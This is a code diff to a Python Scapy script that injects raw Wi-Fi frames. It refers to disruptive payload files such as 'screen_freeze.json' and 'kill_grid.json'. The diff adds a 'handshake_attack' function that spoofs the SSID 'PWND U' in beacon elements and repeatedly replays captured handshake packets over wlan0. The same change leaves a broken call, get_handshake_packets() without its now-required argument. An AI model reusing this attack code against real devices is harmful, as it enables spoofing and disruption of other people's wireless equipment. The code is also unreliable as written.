@@ -15,7 +15,8 @@ pwn_payload_paths = [
     './payloads/screen_freeze.json',
     './payloads/kill_grid.json'
 ]
-handshake_path = './data/handshake.pcap'
+attack_handshake_path = './data/handshake.pcap'
+handshake_unmod_path = './data/handshake_unmod.pcap'
 
 def get_payload_data(payload_file_name):
     f = open(payload_file_name)
@@ -30,7 +31,7 @@ def get_pwn_packet():
     pwn_packet = rdpcap(pwn_packet_path)
     return pwn_packet[0]
 
-def get_handshake_packets():
+def get_handshake_packets(handshake_path):
     handshake_packets = rdpcap(handshake_path)
     return handshake_packets
 
@@ -120,13 +121,53 @@ def load_payload_into_packet(packet, payload_chunks):
             last_elt.add_payload(new_elt)
             last_elt = new_elt
 
-def replay_handshake():
-    handshake_packets = get_handshake_packets()
+def replay_handshake(handshake_path, new_name):
+    handshake_packets = get_handshake_packets(handshake_path)
     for i in  range(0, len(handshake_packets)):
         packet = handshake_packets[i]
 
+        if i == 1 or i == 3:
+            el1 = handshake_packets[i][Dot11][Dot11Beacon][Dot11Elt]
+
+            el1.setfieldval('info', new_name)
+            el1.setfieldval('len', len(new_name))
+
         print(packet.show())
-        sendp(packet, loop=0, count=1, iface="wlan0", verbose=True)
+        sendp(packet, loop=0, count=1, iface="wlan0", verbose=True)        
+
+def handshake_attack():
+    handshake_packets = get_handshake_packets()
+
+    new_ap_name = "PWND U"
+
+    for i in range(0, 100):
+        packet_one = handshake_packets[0]
+        packet_two = handshake_packets[1]
+
+        elt1 = packet_two[Dot11][Dot11Beacon][Dot11Elt]
+
+        elt1.setfieldval('info', new_ap_name)
+        elt1.setfieldval('len', len(new_ap_name))
+
+        sendp(packet_one, loop=0, count=10, iface="wlan0", verbose=True)
+        sendp(packet_two, loop=0, count=10, iface="wlan0", verbose=True)
+        sleep(0.3)
+    
+    sleep(5)
+
+    packet_three = handshake_packets[2]
+    packet_four = handshake_packets[3]
+    
+    elt1 = packet_four[Dot11][Dot11Beacon][Dot11Elt]
+    
+    elt1.setfieldval('info', new_ap_name)
+    elt1.setfieldval('len', len(new_ap_name))
+
+    sendp(packet_three, loop=0, count=1, iface="wlan0", verbose=True)
+    sendp(packet_four, loop=0, count=1, iface="wlan0", verbose=True)
+    
+
+
     
 
 
@@ -136,4 +177,5 @@ def replay_handshake():
 # sleep(5)
 # send_kill_grid()
 
-replay_handshake()
+# handshake_attack()
+# replay_handshake(attack_handshake_path, "PWND U")
